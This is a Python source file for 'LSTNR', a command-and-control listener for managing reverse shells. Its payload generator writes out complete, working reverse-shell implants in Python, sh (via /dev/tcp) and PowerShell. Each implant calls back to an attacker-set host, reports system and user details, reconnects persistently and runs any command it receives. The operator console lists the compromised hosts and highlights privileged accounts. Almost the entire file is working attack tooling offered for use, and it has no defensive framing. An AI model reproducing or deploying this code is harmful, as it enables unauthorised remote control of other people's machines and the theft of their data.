import socket
import threading
import readline
import sys
import signal
import time

RED = "\033[91m"
GREEN = "\033[92m"
BLUE = "\033[94m"
ORANGE = "\033[38;5;214m"
PINK = "\033[95m"
PURPLE = "\033[35m"
YELLOW = "\033[93m"
BROWN = "\033[33m"
WHITE = "\033[97m"
RESET = "\033[0m"

clients = []
addresses = []
session_map = {}  # session_id -> index
next_session_id = 1
server_running = True
current_session = None
in_session = False
session_info = {}  # session_id -> (hostname, username)

MAIN_COMMANDS = ["help", "list", "payload", "select", "die", "exit"]
SESSION_COMMANDS = ["background", "die"]

def main_menu_completer(text, state):
    options = [cmd + " " for cmd in MAIN_COMMANDS if cmd.startswith(text)]
    return options[state] if state < len(options) else None

def session_completer(text, state):
    options = [cmd + " " for cmd in SESSION_COMMANDS if cmd.startswith(text)]
    return options[state] if state < len(options) else None

def signal_handler(sig, frame):
    global in_session
    if in_session:
        print("\n[*] Backgrounding session.")
        raise KeyboardInterrupt
    else:
        print(f"\nType {RED}'exit'{RESET} to stop {BLUE}LSTNR{RESET}")

signal.signal(signal.SIGINT, signal_handler)

def rebuild_session_map():
    global session_map
    new_map = {}
    idx = 0
    for sid in sorted(session_map):
        if session_map[sid] < len(clients):
            new_map[sid] = idx
            idx += 1
    session_map.clear()
    session_map.update(new_map)

def send_command(client, cmd):
    try:
        client.settimeout(5)  # Set timeout to avoid hang
        client.send(cmd.encode() + b"\n")
        data = b""
        while True:
            part = client.recv(4096)
            if not part:
                break
            data += part
            if len(part) < 4096:
                break
        return data.decode(errors="ignore")
    except socket.timeout:
        return "Error: Command timed out."
    except Exception as e:
        return f"Error sending command: {e}"

def send_command_live(client, cmd):
    try:
        client.settimeout(None)  # Remove timeout for long-running commands
        client.send(cmd.encode() + b"\n")
        
        buffer = b""
        
        while True:
            data = client.recv(4096)
            if not data:
                break  # Connection closed

            buffer += data

            # Check if __END__ marker is in the buffer
            if b"__END__" in buffer:
                parts = buffer.split(b"__END__")
                lines = parts[0].splitlines()
                for line in lines:
                    print(line.decode(errors="ignore"))
                break
            else:
                # If no __END__, print full lines from buffer
                lines = buffer.split(b"\n")
                for line in lines[:-1]:  # All lines except last (incomplete)
                    print(line.decode(errors="ignore"))
                buffer = lines[-1]  # Keep the last incomplete line for next data
        
    except Exception as e:
        print(f"Error during live output: {e}")


def session_shell(client, session_id):
    global current_session, in_session
    in_session = True
    readline.set_completer(session_completer)
    readline.parse_and_bind("tab: complete")
    while True:
        try:
            hostname, username, *_ = session_info.get(session_id, ("unknown_host", "unknown_user"))

            # Set color based on user privilege
            if username.lower() in ["root", "administrator", "system"]:
                prompt_color = RED
            else:
                prompt_color = GREEN

            prompt = f"{prompt_color}{username}@{hostname}> {RESET}"
            cmd = input(prompt).strip()

            if cmd == "":
                continue
            elif cmd == "background":
                print("[*] Backgrounding session.")
                break
            elif cmd == "die":
                print(f"[*] Sending {RED}'die'{RESET} to session {session_id}")
                try:
                    client.send(b"die\n")
                    time.sleep(0.5)
                    client.close()
                except:
                    pass
                if session_id in session_map:
                    idx = session_map[session_id]
                    try:
                        del clients[idx]
                        del addresses[idx]
                        del session_info[session_id]
                    except IndexError:
                        pass
                    del session_map[session_id]
                    rebuild_session_map()
                break
            else:
                send_command_live(client, cmd)

        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Error: {e}")
            break
    current_session = None
    in_session = False
    readline.set_completer(main_menu_completer)

def accept_connections(server_socket):
    global next_session_id
    while server_running:
        try:
            client, address = server_socket.accept()
            client.settimeout(10)  # optional, protects handler during initial handshake
            clients.append(client)
            addresses.append(address)
            session_map[next_session_id] = len(clients) - 1

            # Receive hostname and username
            info = client.recv(4096).decode().strip()
            if info:
                parts = info.split(",", 5)
                hostname = parts[0] if len(parts) > 0 else "Unknown"
                username = parts[1] if len(parts) > 1 else "Unknown"
                os_name = parts[2] if len(parts) > 2 else "Unknown"
                version = parts[3] if len(parts) > 3 else "Unknown"
                arch = parts[4] if len(parts) > 4 else "Unknown"
                session_info[next_session_id] = (hostname, username, os_name, version, arch)
            next_session_id += 1
        except Exception:
            break

def send_die_to_all():
    print(f"[*] Sending {RED}'die'{RESET} command to all clients!")
    for client in clients:
        try:
            send_command_live(client, "die")
            client.close()
        except:
            pass

def print_sessions_table(session_map, addresses, session_info):
    # Determine column widths based on content
    headers = ["ID", "IP", "HOSTNAME", "USER", "OS", "VERSION", "ARCH"]
    columns = {header: len(header) for header in headers}

    # Update column sizes based on data
    for sid in sorted(session_map):
        idx = session_map[sid]
        if idx < len(addresses):
            addr = addresses[idx]
            hostname, username, os_name, version, arch = session_info.get(sid, ("Unknown", "Unknown", "Unknown", "Unknown", "Unknown"))
            columns["ID"] = max(columns["ID"], len(str(sid)))
            columns["IP"] = max(columns["IP"], len(addr[0]))
            columns["HOSTNAME"] = max(columns["HOSTNAME"], len(hostname))
            columns["USER"] = max(columns["USER"], len(username))
            columns["OS"] = max(columns["OS"], len(os_name))
            columns["VERSION"] = max(columns["VERSION"], len(version))
            columns["ARCH"] = max(columns["ARCH"], len(arch))

    # Build table header
    border_top = "╔" + "╦".join(["═" * (columns[h] + 2) for h in headers]) + "╗"
    header_row = "║ " + " ║ ".join([h.ljust(columns[h]) for h in headers]) + " ║"
    border_mid = "╠" + "╬".join(["═" * (columns[h] + 2) for h in headers]) + "╣"
    border_bottom = "╚" + "╩".join(["═" * (columns[h] + 2) for h in headers]) + "╝"

    print(WHITE + border_top)
    print(header_row)
    print(border_mid)

    for sid in sorted(session_map):
        idx = session_map[sid]
        if idx < len(addresses):
            addr = addresses[idx]
            hostname, username, os_name, version, arch = session_info.get(sid, ("Unknown", "Unknown", "Unknown", "Unknown", "Unknown"))

            # Color usernames if they are sensitive accounts
            if any(word in username.lower() for word in ["admin", "administrator", "system", "root"]):
                username_display = f"{RED}{username:<{columns['USER']}}{RESET}"
            else:
                username_display = f"{GREEN}{username:<{columns['USER']}}{RESET}"

            row = "║ " + " ║ ".join([
                str(sid).ljust(columns["ID"]),
                addr[0].ljust(columns["IP"]),
                hostname.ljust(columns["HOSTNAME"]),
                username_display,
                os_name.ljust(columns["OS"]),
                version.ljust(columns["VERSION"]),
                arch.ljust(columns["ARCH"]),
            ]) + " ║"
            print(row)
    print(border_bottom + RESET)

## payload builder
PAYLOAD_COMMANDS = ["set", "generate", "back", "options", "help"]
payload_settings = {
    "lhost": "127.0.0.1",
    "lport": "4444",
    "payload": "py"
}

def payload_completer(text, state):
    options = []
    if readline.get_line_buffer().strip().startswith("set"):
        options = ["set lhost ", "set lport ", "set payload "]
    else:
        options = [cmd + " " for cmd in PAYLOAD_COMMANDS if cmd.startswith(text)]
    return options[state] if state < len(options) else None

def show_payload_options():
    print("\nCurrent Payload Options:\n")
    for key, value in payload_settings.items():
        if value.strip() == "":
            print(f"  {key.upper():10}: {RED}<NOT SET>{RESET}")
        else:
            print(f"  {key.upper():10}: {ORANGE}{value}{RESET}")
    print("")


def payload_help():
    print(f"{ORANGE}\nPayload Menu Commands:{RESET}")
    print(f"    set lhost <ip>      - Set the LSTNR IP address")
    print(f"    set lport <port>    - Set the LSTNR listening port")
    print(f"    set payload <type>  - Set payload type (EX: py, sh, ps1)")
    print(f"    options             - Show current payload configuration")
    print(f"    generate            - Generate the payload with current settings")
    print(f"    back                - Return to the main menu")
    print(f"    help                - Show this help menu\n")

def payload_shell():
    readline.set_completer(payload_completer)
    readline.parse_and_bind("tab: complete")
    while True:
        try:
            cmd = input(f"{RED}payload> {RESET}").strip()
            if cmd == "":
                continue
            elif cmd.startswith("set"):
                parts = cmd.split()
                if len(parts) >= 3:
                    key = parts[1].lower()
                    value = " ".join(parts[2:])
                    if key in payload_settings:
                        payload_settings[key] = value
                        print(f"[+] Set {key} to {value}")
                    else:
                        print(f"[-] Unknown setting: {key}")
                else:
                    print("Usage: set <lhost|lport|payload> <value>")
            elif cmd == "generate":
                generate_payload()
            elif cmd == "back":
                print("[*] Returning to main menu.")
                readline.set_completer(main_menu_completer)
                break
            elif cmd == "options":
                show_payload_options()
            elif cmd == "help" or cmd == "?":
                payload_help()
            else:
                print(f"Unknown command. Type {ORANGE}'help'{RESET} for payload options.")
        except KeyboardInterrupt:
            print("\n[*] Returning to main menu.")
            readline.set_completer(main_menu_completer)
            break
        except Exception as e:
            print(f"Error: {e}")

def generate_payload():
    lhost = payload_settings["lhost"]
    lport = payload_settings["lport"]
    payload_type = payload_settings["payload"]

    if payload_type == "py":
        payload_code = f'''import socket
import subprocess
import time
import os
import getpass

SERVER_IP = "{lhost}"
SERVER_PORT = {lport}

def get_system_info():
    try:
        hostname = subprocess.check_output("hostname", shell=True).decode().strip()
        username = getpass.getuser()
        uname_output = subprocess.check_output("uname -a", shell=True).decode().strip()

        parts = uname_output.split()
        os_name = parts[1] if len(parts) > 1 else "Unknown"
        version = parts[2].split("-")[0] if len(parts) > 2 else "Unknown"
        arch = parts[-2] if len(parts) > 2 else "Unknown"

        os_info = f"{{os_name}},{{version}},{{arch}}"
        return hostname, username, os_info
    except Exception:
        return "Unknown", "Unknown", "Unknown,Unknown,Unknown"

def connect():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_IP, SERVER_PORT))

            hostname, username, os_info = get_system_info()
            sock.send(f"{{hostname}},{{username}},{{os_info}}".encode())

            should_continue = shell(sock)
            sock.close()
            if not should_continue:
                break
        except Exception:
            time.sleep(5)

def shell(sock):
    current_directory = os.getcwd()

    while True:
        try:
            command = sock.recv(4096).decode().strip()
            if not command:
                break

            if command.startswith("cd "):
                path = command[3:].strip()
                try:
                    if os.path.isabs(path):
                        os.chdir(path)
                    else:
                        os.chdir(os.path.join(os.getcwd(), path))
                    current_directory = os.getcwd()
                except FileNotFoundError:
                    sock.send(f"Error: No such directory: {{path}}\\n".encode())
                except Exception as e:
                    sock.send(f"Error: {{str(e)}}\\n".encode())
                try:
                    sock.send(b"__END__")
                except:
                    pass
                continue

            if command == "die":
                return False

            proc = subprocess.Popen(
                command,
                shell=True,
                executable="/bin/bash",
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )

            output = ""
            for line in proc.stdout:
                output += line

            if output:
                try:
                    sock.send(output.encode())
                except:
                    break

            try:
                sock.send(b"__END__")
            except:
                pass

        except Exception as e:
            try:
                sock.send(f"Error: {{e}}\\n".encode())
                sock.send(b"__END__")
            except:
                pass
            break

    return True

if __name__ == "__main__":
    connect()
'''
        filename = f"{lhost.replace('.', '_')}_{lport}.py"
        with open(filename, "w") as f:
            f.write(payload_code)
        print(f"[+] Payload generated and saved as {ORANGE}{filename}{RESET}")
    elif payload_type == "sh":
        payload_code = f"""#!/bin/sh

SERVER_IP="{payload_settings['lhost']}"
SERVER_PORT={payload_settings['lport']}

get_system_info() {{
    HOSTNAME="$(hostname)"
    USERNAME="$(whoami)"
    UNAME_OUT="$(uname -a)"

    OS_NAME="$(echo "$UNAME_OUT" | awk '{{print $2}}')"
    VERSION="$(echo "$UNAME_OUT" | awk '{{print $3}}' | cut -d- -f1)"
    ARCH="$(echo "$UNAME_OUT" | awk '{{print $(NF-1)}}')"

    echo "$HOSTNAME,$USERNAME,$OS_NAME,$VERSION,$ARCH"
}}

connect() {{
    while true; do
        exec 3<>/dev/tcp/"$SERVER_IP"/"$SERVER_PORT" 2>/dev/null
        if [ $? -eq 0 ]; then
            SYSTEM_INFO="$(get_system_info)"
            echo "$SYSTEM_INFO" >&3
            shell_loop 3
            exec 3<&- 3>&-
        fi
        sleep 5
    done
}}

shell_loop() {{
    SOCKET=$1
    while true; do
        if ! read -r CMD <&$SOCKET; then
            break
        fi

        [ -z "$CMD" ] && break

        if echo "$CMD" | grep -q "^cd "; then
            DIR="$(echo "$CMD" | cut -d' ' -f2-)"
            if cd "$DIR" 2>/dev/null; then
                :
            else
                echo "Error: No such directory: $DIR" >&$SOCKET
            fi
            echo "__END__" >&$SOCKET
            continue
        fi

        if [ "$CMD" = "die" ]; then
            exit 0
        fi

        OUTPUT="$(sh -c "$CMD" 2>&1)"
        if [ -n "$OUTPUT" ]; then
            echo "$OUTPUT" >&$SOCKET
        fi
        echo "__END__" >&$SOCKET
    done
}}

connect
"""
        filename = f"{lhost.replace('.', '_')}_{lport}.sh"
        with open(filename, "w") as f:
            f.write(payload_code)
        print(f"[+] Payload generated and saved as {ORANGE}{filename}{RESET}")
    elif payload_type == "ps1":
        payload_code = f"""$ServerIP = "{payload_settings['lhost']}"
$ServerPort = {payload_settings['lport']}

function Get-SystemInfo {{
    try {{
        $hostname = [System.Net.Dns]::GetHostName()
        $username = [Environment]::UserName
        $os = Get-CimInstance -ClassName Win32_OperatingSystem
        $osName = $os.Caption -replace "Microsoft ", ""
        $version = $os.Version
        $architecture = $os.OSArchitecture

        return "$hostname,$username,$osName,$version,$architecture"
    }} catch {{
        return "Unknown,Unknown,Unknown,Unknown,Unknown"
    }}
}}

function Connect-Server {{
    while ($true) {{
        try {{
            $client = New-Object System.Net.Sockets.TcpClient
            $client.Connect($ServerIP, $ServerPort)
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $reader = New-Object System.IO.StreamReader($stream)

            $sysinfo = Get-SystemInfo
            $writer.WriteLine($sysinfo)
            $writer.Flush()

            $shouldContinue = Invoke-Shell -Stream $stream -Reader $reader -Writer $writer
            $client.Close()

            if (-not $shouldContinue) {{
                break
            }}
        }} catch {{
            Start-Sleep -Seconds 5
        }}
    }}
}}

function Invoke-Shell {{
    param(
        [Parameter(Mandatory=$true)] [System.Net.Sockets.NetworkStream] $Stream,
        [Parameter(Mandatory=$true)] [System.IO.StreamReader] $Reader,
        [Parameter(Mandatory=$true)] [System.IO.StreamWriter] $Writer
    )

    $currentDirectory = Get-Location

    while ($true) {{
        try {{
            $command = $Reader.ReadLine()
            if ([string]::IsNullOrWhiteSpace($command)) {{
                break
            }}

            if ($command.StartsWith("cd ")) {{
                $path = $command.Substring(3).Trim()
                try {{
                    Set-Location -Path $path -ErrorAction Stop
                    $currentDirectory = Get-Location
                }} catch {{
                    $Writer.WriteLine("Error: No such directory: $path")
                }}
                try {{
                    $Writer.WriteLine("__END__")
                    $Writer.Flush()
                }} catch {{}}
                continue
            }}

            if ($command -eq "die") {{
                return $false
            }}

            try {{
                $output = & {{
                    $result = Invoke-Expression $command 2>&1
                    $result | Out-String
                }}
            }} catch {{
                $output = "Error executing command: $_"
            }}

            if ($output) {{
                $lines = $output -split "`r?`n"
                foreach ($line in $lines) {{
                    try {{
                        $Writer.WriteLine($line)
                    }} catch {{
                        break
                    }}
                }}
                try {{
                    $Writer.WriteLine("__END__")
                    $Writer.Flush()
                }} catch {{}}
            }} else {{
                try {{
                    $Writer.WriteLine("__END__")
                    $Writer.Flush()
                }} catch {{}}
            }}

        }} catch {{
            try {{
                $Writer.WriteLine("Error: $_")
                $Writer.WriteLine("__END__")
                $Writer.Flush()
            }} catch {{}}
            break
        }}
    }}

    return $true
}}

Connect-Server
"""
        filename = f"{lhost.replace('.', '_')}_{lport}.ps1"
        with open(filename, "w") as f:
            f.write(payload_code)
        print(f"[+] Payload generated and saved as {ORANGE}{filename}{RESET}")
    else:
        print(f"[-] Payload type '{payload_type}' not implemented yet.")

def menu_shell():
    global current_session
    readline.set_completer(main_menu_completer)
    readline.parse_and_bind("tab: complete")
    while True:
        try:
            cmd = input(f"{BLUE}LSTNR> {RESET}").strip()
            if cmd == "":
                continue
            elif cmd == "help" or cmd == "?":
                print(f"""
{ORANGE}Menu commands:{RESET}
    list                - List sessions
    select <id>         - Connect to a session by its ID
    payload             - Payload generation menu
    die                 - Terminate all sessions
    exit                - Terminate all sessions and exit LSTNR
{ORANGE}Session commands:{RESET}
    <any command>       - Execute command on client
    background          - Return to main menu
    die                 - Terminate current session
{ORANGE}Payload Menu Commands:{RESET}
    set lhost <ip>      - Set the LSTNR IP address
    set lport <port>    - Set the LSTNR listening port
    set payload <type>  - Set payload type (EX: py, sh, ps1)
    options             - Show current payload configuration
    generate            - Generate the payload with current settings
    back                - Return to the main menu
    help                - Show this help menu
                """)
            elif cmd == "list" or cmd == "ls":
                print_sessions_table(session_map, addresses, session_info)
            elif cmd.startswith("select"):
                try:
                    sid = int(cmd.split()[1])
                    if sid not in session_map or session_map[sid] >= len(clients):
                        print("Invalid session ID")
                        continue
                    current_session = clients[session_map[sid]]
                    print(f"[*] Connected to session {sid}")
                    session_shell(current_session, sid)
                except Exception as e:
                    print(f"Error: {e}")
            elif cmd == "die":
                send_die_to_all()
                clients.clear()
                addresses.clear()
                session_map.clear()
            elif cmd == "exit":
                send_die_to_all()
                print(f"[*] Exiting {BLUE}LSTNR{RESET}.")
                break
            elif cmd == "payload":
                payload_shell()
            else:
                print(f"Unknown command. Type {ORANGE}'help'{RESET} for options.")
        except KeyboardInterrupt:
            print(f"\nType {RED}'exit'{RESET} to stop {BLUE}LSTNR{RESET}")
        except Exception as e:
            print(f"Error: {e}")

def main():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--port", type=int, required=True, help="Port to listen on")
    args = parser.parse_args()

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        server_socket.bind(("0.0.0.0", args.port))
        server_socket.listen(5)
        print(f""" {RED}
██╗     ███████╗████████╗███╗   ██╗██████╗ 
██║     ██╔════╝╚══██╔══╝████╗  ██║██╔══██╗
██║     ███████╗   ██║   ██╔██╗ ██║██████╔╝
██║     ╚════██║   ██║   ██║╚██╗██║██╔══██╗
███████╗███████║   ██║   ██║ ╚████║██║  ██║
╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═══╝╚═╝  ╚═╝
    Remote Command & Control - v0.8
    - MADE FOR REVERSE SHELL MANAGEMENT{RESET}
        """)
        print(f"[+] Listening on {ORANGE}0.0.0.0:{args.port}{RESET}")
    except Exception as e:
        print(f"Failed to bind: {e}")
        sys.exit(1)

    t = threading.Thread(target=accept_connections, args=(server_socket,), daemon=True)
    t.start()

    menu_shell()
    server_socket.close()

if __name__ == "__main__":
    main()
